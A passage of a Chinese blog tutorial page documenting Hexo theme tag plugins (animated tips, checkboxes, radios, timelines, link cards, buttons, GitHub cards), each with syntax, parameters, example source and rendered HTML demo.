aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-6-动态标签-anima">2.6 动态标签 anima</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">配置参数</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tip [参数，可选] %&#125;文本内容&#123;% endtip %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><div class="note info flat"><ol><li>将所需的CSS类添加到图标（或DOM中的任何元素）。</li><li>对于父级悬停样式，需要给目标元素添加指定CSS类，同时还要给目标元素的父级元素添加CSS类<code>faa-parent animated-hover</code>。（详情见示例及示例源码）<br>You can regulate the speed of the animation by adding the CSS class or . faa-fastfaa-slow</li><li>可以通过给目标元素添加CSS类<code>faa-fast</code>或<code>faa-slow</code>来控制动画快慢。</li></ol></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><p>1.On DOM load（当页面加载时显示动画）</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tip warning faa-horizontal animated %&#125;warning&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip ban faa-flash animated %&#125;ban&#123;% endtip %&#125;</span><br></pre></td></tr></table></figure><p>2.调整动画速度</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tip warning faa-horizontal animated faa-fast %&#125;warning&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip ban faa-flash animated faa-slow %&#125;ban&#123;% endtip %&#125;</span><br></pre></td></tr></table></figure><p>3.On hover（当鼠标悬停时显示动画）</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tip warning faa-horizontal animated-hover %&#125;warning&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip ban faa-flash animated-hover %&#125;ban&#123;% endtip %&#125;</span><br></pre></td></tr></table></figure><p>4.On parent hover（当鼠标悬停在父级元素时显示动画）</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tip warning faa-parent animated-hover %&#125;<span class="language-xml"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;faa-horizontal&quot;</span>&gt;</span></span>warning<span class="language-xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span>&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip ban faa-parent animated-hover %&#125;<span class="language-xml"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;faa-flash&quot;</span>&gt;</span></span>ban<span class="language-xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span>&#123;% endtip %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>1.On DOM load（当页面加载时显示动画）</p><div class="tip warning faa-horizontal animated"><p>warning</p></div><div class="tip ban faa-flash animated"><p>ban</p></div>2.调整动画速度<div class="tip warning faa-horizontal animated faa-fast"><p>warning</p></div><div class="tip ban faa-flash animated faa-slow"><p>ban</p></div>3.On hover（当鼠标悬停时显示动画）<div class="tip warning faa-horizontal animated-hover"><p>warning</p></div><div class="tip ban faa-flash animated-hover"><p>ban</p></div>4.On parent hover（当鼠标悬停在父级元素时显示动画）<div class="tip warning faa-parent animated-hover"><p class="faa-horizontal">warning</p></div><div class="tip ban faa-parent animated-hover"><p class="faa-flash">ban</p></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-7-复选列表-checkbox">2.7 复选列表 checkbox</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">配置参数</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% checkbox 样式参数（可选）, 文本（支持简单md） %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>样式</code>: plus, minus, times</li><li><code>颜色</code>: red,yellow,green,cyan,blue,gray</li><li><code>选中状态</code>: checked</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;% checkbox 纯文本测试 %&#125;</span><br><span class="line">&#123;% checkbox checked, 支持简单的 [<span class="string">markdown</span>](<span class="link">https://guides.github.com/features/mastering-markdown/</span>) 语法 %&#125;</span><br><span class="line">&#123;% checkbox red, 支持自定义颜色 %&#125;</span><br><span class="line">&#123;% checkbox green checked, 绿色 + 默认选中 %&#125;</span><br><span class="line">&#123;% checkbox yellow checked, 黄色 + 默认选中 %&#125;</span><br><span class="line">&#123;% checkbox cyan checked, 青色 + 默认选中 %&#125;</span><br><span class="line">&#123;% checkbox blue checked, 蓝色 + 默认选中 %&#125;</span><br><span class="line">&#123;% checkbox plus green checked, 增加 %&#125;</span><br><span class="line">&#123;% checkbox minus yellow checked, 减少 %&#125;</span><br><span class="line">&#123;% checkbox times red checked, 叉 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><div class='checkbox'><input type="checkbox" />            <p>纯文本测试</p>            </div><div class='checkbox checked'><input type="checkbox" checked="checked"/>            <p>支持简单的 <a href="https://guides.github.com/features/mastering-markdown/">markdown</a> 语法</p>            </div><div class='checkbox red'><input type="checkbox" />            <p>支持自定义颜色</p>            </div><div class='checkbox green checked'><input type="checkbox" checked="checked"/>            <p>绿色 + 默认选中</p>            </div><div class='checkbox yellow checked'><input type="checkbox" checked="checked"/>            <p>黄色 + 默认选中</p>            </div><div class='checkbox cyan checked'><input type="checkbox" checked="checked"/>            <p>青色 + 默认选中</p>            </div><div class='checkbox blue checked'><input type="checkbox" checked="checked"/>            <p>蓝色 + 默认选中</p>            </div><div class='checkbox plus green checked'><input type="checkbox" checked="checked"/>            <p>增加</p>            </div><div class='checkbox minus yellow checked'><input type="checkbox" checked="checked"/>            <p>减少</p>            </div><div class='checkbox times red checked'><input type="checkbox" checked="checked"/>            <p>叉</p>            </div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-8-单选列表-radio">2.8 单选列表 radio</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">配置参数</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% radio 样式参数（可选）, 文本（支持简单md） %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>颜色</code>: red,yellow,green,cyan,blue,gray</li><li><code>选中状态</code>: checked</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% radio 纯文本测试 %&#125;</span><br><span class="line">&#123;% radio checked, 支持简单的 [<span class="string">markdown</span>](<span class="link">https://guides.github.com/features/mastering-markdown/</span>) 语法 %&#125;</span><br><span class="line">&#123;% radio red, 支持自定义颜色 %&#125;</span><br><span class="line">&#123;% radio green, 绿色 %&#125;</span><br><span class="line">&#123;% radio yellow, 黄色 %&#125;</span><br><span class="line">&#123;% radio cyan, 青色 %&#125;</span><br><span class="line">&#123;% radio blue, 蓝色 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><div class='checkbox'><input type="radio" />            <p>纯文本测试</p>            </div><div class='checkbox checked'><input type="radio" checked="checked"/>            <p>支持简单的 <a href="https://guides.github.com/features/mastering-markdown/">markdown</a> 语法</p>            </div><div class='checkbox red'><input type="radio" />            <p>支持自定义颜色</p>            </div><div class='checkbox green'><input type="radio" />            <p>绿色</p>            </div><div class='checkbox yellow'><input type="radio" />            <p>黄色</p>            </div><div class='checkbox cyan'><input type="radio" />            <p>青色</p>            </div><div class='checkbox blue'><input type="radio" />            <p>蓝色</p>            </div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-9-时间轴-timeline">2.9 时间轴 timeline</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">配置参数</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;% timeline 时间线标题（可选）[,color] %&#125;</span><br><span class="line">&lt;!-- timeline 时间节点（标题） --&gt;</span><br><span class="line">正文内容</span><br><span class="line">&lt;!-- endtimeline --&gt;</span><br><span class="line">&lt;!-- timeline 时间节点（标题） --&gt;</span><br><span class="line">正文内容</span><br><span class="line">&lt;!-- endtimeline --&gt;</span><br><span class="line">&#123;% endtimeline %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>title</code>:标题/时间线</li><li><code>color</code>:<code>timeline</code>颜色:default(留空) / blue / pink / red / purple / orange / green</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&#123;% timeline 时间轴样式,blue %&#125;</span><br><span class="line"></span><br><span class="line">&lt;!-- timeline 2020-07-24 [<span class="string">2.6.6 -&gt; 3.0</span>](<span class="link">https://github.com/volantis-x/hexo-theme-volantis/releases</span>) --&gt;</span><br><span class="line"></span><br><span class="line"><span class="bullet">1.</span> 如果有 <span class="code">`hexo-lazyload-image`</span> 插件，需要删除并重新安装最新版本，设置 <span class="code">`lazyload.isSPA: true`</span>。</span><br><span class="line"><span class="bullet">2.</span> 2.x 版本的 css 和 js 不适用于 3.x 版本，如果使用了 <span class="code">`use_cdn: true`</span> 则需要删除。</span><br><span class="line"><span class="bullet">3.</span> 2.x 版本的 fancybox 标签在 3.x 版本中被重命名为 gallery 。</span><br><span class="line"><span class="bullet">4.</span> 2.x 版本的置顶 <span class="code">`top: true`</span> 改为了 <span class="code">`pin: true`</span>，并且同样适用于 <span class="code">`layout: page`</span> 的页面。</span><br><span class="line"><span class="bullet">5.</span> 如果使用了 <span class="code">`hexo-offline`</span> 插件，建议卸载，3.0 版本默认开启了 pjax 服务。</span><br><span class="line"></span><br><span class="line">&lt;!-- endtimeline --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- timeline 2020-05-15 [<span class="string">2.6.3 -&gt; 2.6.6</span>](<span class="link">https://github.com/volantis-x/hexo-theme-volantis/releases/tag/2.6.6</span>) --&gt;</span><br><span class="line"></span><br><span class="line">不需要额外处理。</span><br><span class="line"></span><br><span class="line">&lt;!-- endtimeline --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- timeline 2020-04-20 [<span class="string">2.6.2 -&gt; 2.6.3</span>](<span class="link">https://github.com/volantis-x/hexo-theme-volantis/releases/tag/2.6.3</span>) --&gt;</span><br><span class="line"></span><br><span class="line"><span class="bullet">1.</span> 全局搜索 <span class="code">`seotitle`</span> 并替换为 <span class="code">`seo_title`</span>。</span><br><span class="line"><span class="bullet">2.</span> group 组件的索引规则有变，使用 group 组件的文章内，<span class="code">`group: group_name`</span> 对应的组件名必须是 <span class="code">`group_name`</span>。</span><br><span class="line"><span class="bullet">2.</span> group 组件的列表名优先显示文章的 <span class="code">`short_title`</span> 其次是 <span class="code">`title`</span>。</span><br><span class="line"></span><br><span class="line">&lt;!-- endtimeline --&gt;</span><br><span class="line"></span><br><span class="line">&#123;% endtimeline %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><div class="timeline blue"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>时间轴样式</p></div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>2020-07-24 <a href="https://github.com/volantis-x/hexo-theme-volantis/releases">2.6.6 -&gt; 3.0</a></p></div></div><div class='timeline-item-content'><ol><li>如果有 <code>hexo-lazyload-image</code> 插件，需要删除并重新安装最新版本，设置 <code>lazyload.isSPA: true</code>。</li><li>2.x 版本的 css 和 js 不适用于 3.x 版本，如果使用了 <code>use_cdn: true</code> 则需要删除。</li><li>2.x 版本的 fancybox 标签在 3.x 版本中被重命名为 gallery 。</li><li>2.x 版本的置顶 <code>top: true</code> 改为了 <code>pin: true</code>，并且同样适用于 <code>layout: page</code> 的页面。</li><li>如果使用了 <code>hexo-offline</code> 插件，建议卸载，3.0 版本默认开启了 pjax 服务。</li></ol></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>2020-05-15 <a href="https://github.com/volantis-x/hexo-theme-volantis/releases/tag/2.6.6">2.6.3 -&gt; 2.6.6</a></p></div></div><div class='timeline-item-content'><p>不需要额外处理。</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>2020-04-20 <a href="https://github.com/volantis-x/hexo-theme-volantis/releases/tag/2.6.3">2.6.2 -&gt; 2.6.3</a></p></div></div><div class='timeline-item-content'><ol><li>全局搜索 <code>seotitle</code> 并替换为 <code>seo_title</code>。</li><li>group 组件的索引规则有变，使用 group 组件的文章内，<code>group: group_name</code> 对应的组件名必须是 <code>group_name</code>。</li><li>group 组件的列表名优先显示文章的 <code>short_title</code> 其次是 <code>title</code>。</li></ol></div></div></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-10-链接卡片-link">2.10 链接卡片 link</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-3">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% link 标题, 链接, 图片链接（可选） %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% link 糖果屋教程贴, https://akilar.top/posts/615e2dec/, https://cdn.cbd.int/akilar-candyassets@1.0.36/image/siteicon/favicon.ico %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><div class="tag link"><a class="link-card" title="糖果屋教程贴" href="https://akilar.top/posts/615e2dec/"><div class="left"><img src="https://cdn.cbd.int/akilar-candyassets@1.0.36/image/siteicon/favicon.ico"/></div><div class="right"><p class="text">糖果屋教程贴</p><p class="url">https://akilar.top/posts/615e2dec/</p></div></a></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-11-按钮-btns">2.11 按钮 btns</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% btns 样式参数 %&#125;</span><br><span class="line">&#123;% cell 标题, 链接, 图片或者图标 %&#125;</span><br><span class="line">&#123;% cell 标题, 链接, 图片或者图标 %&#125;</span><br><span class="line">&#123;% endbtns %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li>圆角样式：rounded, circle</li><li>增加文字样式：可以在容器内增加 <code>&lt;b&gt;</code>标题<code>&lt;/b&gt;</code>和<code>&lt;p&gt;</code>描述文字<code>&lt;/p&gt;</code></li><li>布局方式：<br>默认为自动宽度，适合视野内只有一两个的情况。</li></ol><table><thead><tr><th>参数</th><th>含义</th></tr></thead><tbody><tr><td>wide</td><td>宽一点的按钮</td></tr><tr><td>fill</td><td>填充布局，自动铺满至少一行，多了会换行</td></tr><tr><td>center</td><td>居中，按钮之间是固定间距</td></tr><tr><td>around</td><td>居中分散</td></tr><tr><td>grid2</td><td>等宽最多2列，屏幕变窄会适当减少列数</td></tr><tr><td>grid3</td><td>等宽最多3列，屏幕变窄会适当减少列数</td></tr><tr><td>grid4</td><td>等宽最多4列，屏幕变窄会适当减少列数</td></tr><tr><td>grid5</td><td>等宽最多5列，屏幕变窄会适当减少列数</td></tr></tbody></table><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><p>1.如果需要显示类似「团队成员」之类的一组含有头像的链接</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% btns circle grid5 %&#125;</span><br><span class="line">&#123;% cell xaoxuu, https://xaoxuu.com, https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png %&#125;</span><br><span class="line">&#123;% cell xaoxuu, https://xaoxuu.com, https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png %&#125;</span><br><span class="line">&#123;% cell xaoxuu, https://xaoxuu.com, https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png %&#125;</span><br><span class="line">&#123;% cell xaoxuu, https://xaoxuu.com, https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png %&#125;</span><br><span class="line">&#123;% cell xaoxuu, https://xaoxuu.com, https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png %&#125;</span><br><span class="line">&#123;% endbtns %&#125;</span><br></pre></td></tr></table></figure><p>2.或者含有图标的按钮</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% btns rounded grid5 %&#125;</span><br><span class="line">&#123;% cell 下载源码, /, fas fa-download %&#125;</span><br><span class="line">&#123;% cell 查看文档, /, fas fa-book-open %&#125;</span><br><span class="line">&#123;% endbtns %&#125;</span><br></pre></td></tr></table></figure><p>3.圆形图标 + 标题 + 描述 + 图片 + 网格5列 + 居中</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;% btns circle center grid5 %&#125;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;https://apps.apple.com/cn/app/heart-mate-pro-hrm-utility/id1463348922?ls=1&#x27;</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">&#x27;fab fa-apple&#x27;</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">b</span>&gt;</span></span>心率管家<span class="language-xml"><span class="tag">&lt;/<span class="name">b</span>&gt;</span></span></span><br><span class="line">  &#123;% p red, 专业版 %&#125;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;https://cdn.jsdelivr.net/gh/fomalhaut1998/cdn-assets/qrcode/heartmate_pro.png&#x27;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;https://apps.apple.com/cn/app/heart-mate-lite-hrm-utility/id1475747930?ls=1&#x27;</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">&#x27;fab fa-apple&#x27;</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">b</span>&gt;</span></span>心率管家<span class="language-xml"><span class="tag">&lt;/<span class="name">b</span>&gt;</span></span></span><br><span class="line">  &#123;% p green, 免费版 %&#125;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;https://cdn.jsdelivr.net/gh/fomalhaut1998/cdn-assets/qrcode/heartmate_lite.png&#x27;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line">&#123;% endbtns %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>1.如果需要显示类似「团队成员」之类的一组含有头像的链接</p><div class="btns circle grid5">            <a class="button" href='https://xaoxuu.com' title='xaoxuu'><img src='https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png'>xaoxuu</a><a class="button" href='https://xaoxuu.com' title='xaoxuu'><img src='https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png'>xaoxuu</a><a class="button" href='https://xaoxuu.com' title='xaoxuu'><img src='https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png'>xaoxuu</a><a class="button" href='https://xaoxuu.com' title='xaoxuu'><img src='https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png'>xaoxuu</a><a class="button" href='https://xaoxuu.com' title='xaoxuu'><img src='https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png'>xaoxuu</a>          </div>2.或者含有图标的按钮<div class="btns rounded grid5">            <a class="button" href='/' title='下载源码'><i class='fas fa-download'></i>下载源码</a><a class="button" href='/' title='查看文档'><i class='fas fa-book-open'></i>查看文档</a>          </div>3.圆形图标 + 标题 + 描述 + 图片 + 网格5列 + 居中<div class="btns circle center grid5">            <a href='https://apps.apple.com/cn/app/heart-mate-pro-hrm-utility/id1463348922?ls=1'>  <i class='fab fa-apple'></i>  <b>心率管家</b>  <p class='p red'>专业版</p>  <img src='https://cdn.jsdelivr.net/gh/fomalhaut1998/cdn-assets/qrcode/heartmate_pro.png'></a><a href='https://apps.apple.com/cn/app/heart-mate-lite-hrm-utility/id1475747930?ls=1'>  <i class='fab fa-apple'></i>  <b>心率管家</b>  <p class='p green'>免费版</p>  <img src='https://cdn.jsdelivr.net/gh/fomalhaut1998/cdn-assets/qrcode/heartmate_lite.png'></a>          </div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-12-github卡片-ghcard">2.12 github卡片 ghcard</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% ghcard 用户名, 其它参数（可选） %&#125;</span><br><span class="line">&#123;% ghcard 用户名/仓库, 其它参数（可选） %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><p>使用<code>,</code>分割各个参数。写法为：<code>参数名=参数值</code><br>以下只写几个常用参数值。</p><table><thead><tr><th><strong>参数名</strong></th><th>取值</th><th>释义</th></tr></thead><tbody><tr><td>hide</td><td>stars,commits,prs,issues,contribs</td><td>隐藏指定统计</td></tr><tr><td>count_private</td><td>true</td><td>将私人项目贡献添加到总提交计数中</td></tr><tr><td>show_icons</td><td>true</td><td>显示图标</td></tr><tr><td>theme</td><td>查阅:<a href="https://github.com/anuraghazra/github-readme-stats/blob/master/themes/README.md">Available Themes</a></td><td>主题</td></tr></tbody></table><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><p>1.用户信息卡片</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">| &#123;% ghcard fomalhaut1998 %&#125; | &#123;% ghcard fomalhaut1998, theme=vue %&#125; |</span><br><span class="line">| -- | -- |</span><br><span class="line">| &#123;% ghcard fomalhaut1998, theme=buefy %&#125; | &#123;% ghcard fomalhaut1998, theme=solarized-light %&#125; |</span><br><span class="line">| &#123;% ghcard fomalhaut1998, theme=onedark %&#125; | &#123;% ghcard fomalhaut1998, theme=solarized-dark %&#125; |</span><br><span class="line">| &#123;% ghcard fomalhaut1998, theme=algolia %&#125; | &#123;% ghcard fomalhaut1998, theme=calm %&#125; |</span><br></pre></td></tr></table></figure><p>2.仓库信息卡片</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">| &#123;% ghcard 